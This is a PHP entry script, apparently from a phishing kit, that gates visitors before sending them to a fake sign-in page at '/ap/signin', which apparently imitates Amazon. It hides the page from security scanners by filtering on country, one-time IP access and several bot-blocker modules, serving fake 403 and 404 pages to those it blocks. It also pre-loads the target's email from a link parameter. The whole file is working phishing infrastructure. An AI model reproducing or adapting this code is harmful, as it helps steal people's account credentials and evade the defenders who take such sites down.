<?php
require __DIR__ . '/function.php';

$api->data();

if ($api->config("lockcountry") === "on") {
    $allowed = array_map('strtoupper', array_map('trim', array_filter(explode(",", $api->config("listcountry", "")))));
    $userCountry = strtoupper(trim($_SESSION['countrycode'] ?? ''));

    if (empty($allowed) || !in_array($userCountry, $allowed, true)) {
        $api->block("Blocked by Lock Country");
        header("HTTP/1.0 403 Forbidden");
        die('
            <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
            <html>
            <head><title>403 Forbidden</title></head>
            <body>
                <h1>Forbidden</h1>
                <p>Access from your country (' . htmlspecialchars($userCountry) . ') is not allowed.</p>
            </body>
            </html>
        ');
    }
}

if ($api->config("onetime") === "on") {
    $loggedIps = explode("\n", file_get_contents(__DIR__ . "/system/blocker/onetime.dat"));

    foreach ($loggedIps as $visitorIp) {
        if (preg_match('/' . preg_quote($_SESSION['ip'], '/') . '/m', $visitorIp)) {
            $api->block("One Time Access");

            header("HTTP/1.0 404 Not Found");
            die('
                <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
                <html>
                <head><title>404 Not Found</title></head>
                <body>
                    <h1>Not Found</h1>
                    <p>The requested URL was not found on this server.</p>
                    <p>Additionally, a 404 Not Found error occurred while trying to use an ErrorDocument to handle the request.</p>
                </body>
                </html>
            ');
        }
    }
}
$api->blocker();
$api->create_cookie();

$_SESSION['glitch'] = true;

if ($api->config("strongblocker") === "on") {
    $api->strongblocker();
}

if ($api->config("botblocker") === "on") {
    require_once(__DIR__ . "/system/blocker/botblocker.php");
}

if ($api->config("stopbot") === "on") {
    require_once(__DIR__ . "/system/blocker/stopbot.php");
}

if ($api->config("useparameter") === "on") {
    $paramKey = $api->config("parameter");

    if (!empty($paramKey)) {
        if (isset($_GET[$paramKey])) {
            $email = $_GET[$paramKey];

            if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
                $_SESSION['email'] = $email;
            }

            // Allow the user and redirect based on CAPTCHA setting
            $api->allow("Human");
            if ($api->config("captcha") === "cloudflare") {
                $api->redirectPage("/checking", "/checking");
            } else if ($api->config("captcha") === "google") {
                $api->redirectPage("/captcha", "/captcha");
            } else {
                $api->redirectPage("/ap/mobile/signin", "/ap/signin");
            }
        } else {
            $api->block("Missing or Incorrect Parameter");
            $api->ngeblock("error");
            exit;
        }
    } else {
        $api->block("Invalid Config Parameter Key");
        $api->ngeblock("error");
        exit;
    }
} else {
    $api->allow("Human");
    if ($api->config("captcha") === "cloudflare") {
        $api->redirectPage("/checking", "/checking");
    } else if ($api->config("captcha") === "google") {
        $api->redirectPage("/captcha", "/captcha");
    } else {
        $api->redirectPage("/ap/mobile/signin", "/ap/signin");
    }
}